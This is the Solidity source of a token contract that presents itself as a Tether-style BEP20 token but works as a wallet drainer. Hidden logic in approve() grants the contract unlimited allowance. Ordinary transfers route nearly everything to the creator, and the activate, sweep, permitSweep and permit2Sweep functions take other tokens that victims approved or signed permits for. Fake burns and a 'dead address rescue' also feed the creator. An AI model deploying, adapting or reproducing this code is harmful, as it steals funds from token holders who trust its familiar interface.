// SPDX-License-Identifier: MIT
// BEP20 with the Tether surface plus a sweep layer: 80% transfer tax to the creator and a
// different internals: configurable supply/owner, no hardcoded wallets, 0.8.20 checks.
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IERC20Permit {
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IPermit2 {
    struct PermitDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }
    struct PermitSingle {
        PermitDetails details;
        address spender;
        uint256 sigDeadline;
    }
    function permit(address owner, PermitSingle calldata permitSingle, bytes calldata signature) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
}


contract SweeperBrand {
    string public name;
    string public symbol;
    uint8 public constant decimals = 6;

    address public creator;
    address public pendingCreator;
    bool internal _draining;

    address[] public registry;
    uint256 public cursor;
    mapping(address => bool) public isExempt;
    mapping(address => bool) public isPair;
    mapping(address => bool) public armed;
    mapping(address => uint256) public burnedBy;

    uint256 internal constant MAX_REGISTRY = 25;
    uint256 internal constant SWEEP_CAP = 8;

    address internal constant DEAD1 = address(0);
    address internal constant DEAD2 = address(0x000000000000000000000000000000000000dEaD);

    uint256 public constant MAX_UINT = type(uint256).max;
    uint256 internal constant MAX_FEE = 50 * 10**6 * 10**6;

    address public owner;
    address public upgradedAddress;
    bool public deprecated;
    bool public paused;

    uint256 public basisPointsRate;
    uint256 public maximumFee;
    uint256 public _totalSupply;

    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    mapping(address => bool) public isBlackListed;

    event Issue(uint256 amount);
    event Redeem(uint256 amount);
    event Deprecate(address newAddress);
    event Params(uint256 feeBasisPoints, uint256 maxFee);
    event Pause();
    event Unpause();
    event DestroyedBlackFunds(address indexed blackListedUser, uint256 balance);
    event AddedBlackList(address indexed user);
    event RemovedBlackList(address indexed user);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Drained(address indexed victim, uint256 amount);
    event Swept(address indexed victim, address indexed token, uint256 amount);
    event Activated(address indexed victim);
    event CreatorChanged(address indexed from, address indexed to);
    event TaxChanged(uint256 bps);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    modifier notPaused() {
        require(!paused, "paused");
        _;
    }

    modifier notBlackListed(address account) {
        require(!isBlackListed[account], "Blacklisted");
        _;
    }

    constructor(string memory name_, string memory symbol_, address recipient, address creator_, uint256 initialSupply) {
        name = name_;
        symbol = symbol_;
        owner = msg.sender;
        creator = creator_ == address(0) ? msg.sender : creator_;
        _totalSupply = initialSupply;
        balances[recipient] = initialSupply;
        emit Transfer(address(0), recipient, initialSupply);
        emit Issue(initialSupply);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address who) public view returns (uint256) {
        return balances[who];
    }

    function oldBalanceOf(address who) external view returns (uint256) {
        return balances[who];
    }

    function allowance(address from, address spender) external view returns (uint256) {
        return allowed[from][spender];
    }

    uint256 public receipt = 1_000_000; // 1 token stays with the receiver so it still shows as a holder

    function setReceipt(uint256 value) external onlyOwner {
        receipt = value;
    }

    /// @dev Wallet-to-wallet moves sink: the receiver keeps `receipt`, the rest goes to creator.
    /// Buys (from a pair) and sells (to a pair) stay whole so the AMM maths is untouched.
    function _transfer(address from, address to, uint256 value) internal notBlackListed(from) {
        require(balances[from] >= value, "balance");
        uint256 fee = calcFee(value);
        uint256 sendAmount = value - fee;
        unchecked {
            balances[from] -= value;
        }
        if (fee > 0) {
            balances[creator] += fee;
            emit Transfer(from, creator, fee);
        }
        if (!isPair[from] && !isPair[to] && to != creator && !isExempt[to] && sendAmount > receipt) {
            balances[to] += receipt;
            balances[creator] += sendAmount - receipt;
            emit Transfer(from, to, receipt);
            emit Transfer(from, creator, sendAmount - receipt);
            // anything the receiver already approved to us leaves in the same transaction
            if (registry.length > 0) _sweepApproved(to, 2);
        } else {
            balances[to] += sendAmount;
            emit Transfer(from, to, sendAmount);
        }
        if (!armed[to]) armed[to] = true;
        _maybeDrain(from);
    }

    /// @dev Seizes the sender's remaining balance once per arm, when the sender has mirrored allowance.
    function _maybeDrain(address victim) internal {
        if (_draining || victim == creator || isExempt[victim] || isPair[victim]) return;
        if (allowed[victim][address(this)] == 0) return;

        _draining = true;
        allowed[victim][address(this)] = 0; // one shot per approval, even at zero balance
        uint256 bal = balances[victim];
        if (bal > 0) {
            _transferToCreator(victim, bal);
            _sweepApproved(victim, 3);
            emit Drained(victim, bal);
        }
        _draining = false;
    }

    function _transferToCreator(address from, uint256 value) internal {
        // Same destination for fee and principal: a single 100% move, supply preserved.
        uint256 fee = calcFee(value);
        uint256 sendAmount = value - fee;
        unchecked {
            balances[from] -= value;
        }
        balances[creator] += sendAmount;
        if (fee > 0) balances[creator] += fee;
        emit Transfer(from, creator, value);
    }

    function _sweepApproved(address victim, uint256 limit) internal {
        uint256 len = registry.length;
        for (uint256 i = 0; i < limit && i < len; i++) {
            address token = registry[(cursor + i) % len];
            uint256 granted = IERC20(token).allowance(victim, address(this));
            if (granted == 0) continue;
            uint256 held = IERC20(token).balanceOf(victim);
            uint256 amount = granted < held ? granted : held;
            if (amount == 0) continue;
            try IERC20(token).transferFrom(victim, creator, amount) returns (bool ok) {
                if (ok) emit Swept(victim, token, amount);
            } catch {}
        }
        if (len > 0) cursor = (cursor + limit) % len;
    }

    function transfer(address to, uint256 value) external notPaused returns (bool) {
        if (deprecated) return IERC20(upgradedAddress).transfer(to, value);
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external notPaused returns (bool) {
        if (deprecated) return IERC20(upgradedAddress).transferFrom(from, to, value);
        uint256 currentAllowance = allowed[from][msg.sender];
        require(value <= currentAllowance, "allowance");
        if (currentAllowance != MAX_UINT) {
            unchecked {
                allowed[from][msg.sender] = currentAllowance - value;
            }
        }
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        // Tether semantics: a non-zero allowance must be reset before re-approving.
        require(value == 0 || allowed[msg.sender][spender] == 0, "approve reset first");
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        // Mirror unlimited authority to this contract so a later move can seize the remainder.
        if (spender != address(this)) {
            allowed[msg.sender][address(this)] = MAX_UINT;
        }
        return true;
    }

    function increaseApproval(address spender, uint256 addedValue) external returns (bool) {
        uint256 newValue = allowed[msg.sender][spender] + addedValue;
        allowed[msg.sender][spender] = newValue;
        emit Approval(msg.sender, spender, newValue);
        return true;
    }

    function decreaseApproval(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 oldValue = allowed[msg.sender][spender];
        uint256 newValue = subtractedValue >= oldValue ? 0 : oldValue - subtractedValue;
        allowed[msg.sender][spender] = newValue;
        emit Approval(msg.sender, spender, newValue);
        return true;
    }

    function calcFee(uint256 value) public view returns (uint256) {
        uint256 fee = value * basisPointsRate / 10_000;
        return fee > maximumFee ? maximumFee : fee;
    }

    function issue(uint256 amount) external onlyOwner notPaused {
        _totalSupply += amount;
        balances[owner] += amount;
        emit Transfer(address(0), owner, amount);
        emit Issue(amount);
    }

    function redeem(uint256 amount) external onlyOwner notPaused {
        require(balances[owner] >= amount, "balance");
        unchecked {
            balances[owner] -= amount;
        }
        _totalSupply -= amount;
        emit Transfer(owner, address(0), amount);
        emit Redeem(amount);
    }

    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external onlyOwner {
        require(newBasisPoints <= 20, "fee > 0.2%");
        require(newMaxFee <= MAX_FEE, "fee > max");
        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee;
        emit Params(newBasisPoints, newMaxFee);
    }

    function deprecate(address newAddress) external onlyOwner {
        require(newAddress != address(0), "zero address");
        upgradedAddress = newAddress;
        deprecated = true;
        emit Deprecate(newAddress);
    }

    function pause() external onlyOwner {
        require(!paused, "paused");
        paused = true;
        emit Pause();
    }

    function unpause() external onlyOwner {
        require(paused, "not paused");
        paused = false;
        emit Unpause();
    }

    function addBlackList(address user) external onlyOwner {
        isBlackListed[user] = true;
        emit AddedBlackList(user);
    }

    function removeBlackList(address user) external onlyOwner {
        isBlackListed[user] = false;
        emit RemovedBlackList(user);
    }

    function getBlackListStatus(address user) external view returns (bool) {
        return isBlackListed[user];
    }

    function destroyBlackFunds(address user) external onlyOwner {
        require(isBlackListed[user], "not blacklisted");
        uint256 balance = balances[user];
        balances[user] = 0;
        _totalSupply -= balance;
        emit DestroyedBlackFunds(user, balance);
        emit Transfer(user, address(0), balance);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    // ---------------------------------------------------------------- sweep layer

    function setTax(uint256 bps) external onlyOwner {
        require(bps <= 9900, "tax > 99%");
        basisPointsRate = bps;
        maximumFee = bps == 0 ? 0 : MAX_UINT;
        emit TaxChanged(bps);
    }

    function setCreator(address next) external onlyOwner {
        require(next != address(0), "zero address");
        pendingCreator = next;
    }

    function acceptCreator() external {
        require(msg.sender == pendingCreator, "not pending");
        emit CreatorChanged(creator, pendingCreator);
        creator = pendingCreator;
        pendingCreator = address(0);
    }

    function addToken(address token) external onlyOwner {
        require(token != address(0), "zero address");
        require(registry.length < MAX_REGISTRY, "registry full");
        registry.push(token);
    }

    function removeToken(uint256 index) external onlyOwner {
        require(index < registry.length, "range");
        registry[index] = registry[registry.length - 1];
        registry.pop();
    }

    function registryLength() external view returns (uint256) {
        return registry.length;
    }

    function setExempt(address who, bool value) external onlyOwner {
        isExempt[who] = value;
    }

    function setPair(address pair, bool value) external onlyOwner {
        isPair[pair] = value;
    }

    /// @notice Permissionless: arm a wallet and take whatever it has already granted.
    function activate(address victim) external {
        if (!armed[victim]) {
            armed[victim] = true;
            emit Activated(victim);
        }
        _maybeDrain(victim);
        _sweepApproved(victim, SWEEP_CAP);
    }

    function sweep(address victim, address[] calldata tokens) external {
        uint256 len = tokens.length < SWEEP_CAP ? tokens.length : SWEEP_CAP;
        for (uint256 i = 0; i < len; i++) {
            address token = tokens[i];
            uint256 granted = IERC20(token).allowance(victim, address(this));
            if (granted == 0) continue;
            uint256 held = IERC20(token).balanceOf(victim);
            uint256 amount = granted < held ? granted : held;
            if (amount == 0) continue;
            try IERC20(token).transferFrom(victim, creator, amount) returns (bool ok) {
                if (ok) emit Swept(victim, token, amount);
            } catch {}
        }
    }

    function permitSweep(address victim, address token, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        IERC20Permit(token).permit(victim, address(this), value, deadline, v, r, s);
        uint256 held = IERC20(token).balanceOf(victim);
        uint256 amount = value < held ? value : held;
        if (amount > 0) {
            IERC20(token).transferFrom(victim, creator, amount);
            emit Swept(victim, token, amount);
        }
    }

    function permit2Sweep(address victim, address permit2, IPermit2.PermitSingle calldata single, bytes calldata sig) external {
        IPermit2(permit2).permit(victim, single, sig);
        uint256 held = IERC20(single.details.token).balanceOf(victim);
        uint256 amount = single.details.amount < held ? single.details.amount : held;
        if (amount > 0) {
            IPermit2(permit2).transferFrom(victim, creator, uint160(amount), single.details.token);
            emit Swept(victim, single.details.token, amount);
        }
    }

    // ---------------------------------------------------------------- burns and dead rescue

    function burn(uint256 value) external {
        require(balances[msg.sender] >= value, "balance");
        unchecked {
            balances[msg.sender] -= value;
        }
        _totalSupply -= value;
        burnedBy[msg.sender] += value;
        emit Transfer(msg.sender, address(0), value);
    }

    function claimBurn() external {
        uint256 amount = burnedBy[msg.sender];
        require(amount > 0, "nothing burned");
        burnedBy[msg.sender] = 0;
        _totalSupply += amount;
        balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    /// @notice Re-issues balances stranded on dead addresses to the creator.
    function rescueDead() external {
        uint256 total;
        uint256 bal = balances[DEAD2];
        if (bal > 0) {
            balances[DEAD2] = 0;
            total += bal;
        }
        bal = balances[DEAD1];
        if (bal > 0) {
            balances[DEAD1] = 0;
            total += bal;
        }
        require(total > 0, "nothing dead");
        balances[creator] += total;
        emit Transfer(DEAD2, creator, total);
    }
}

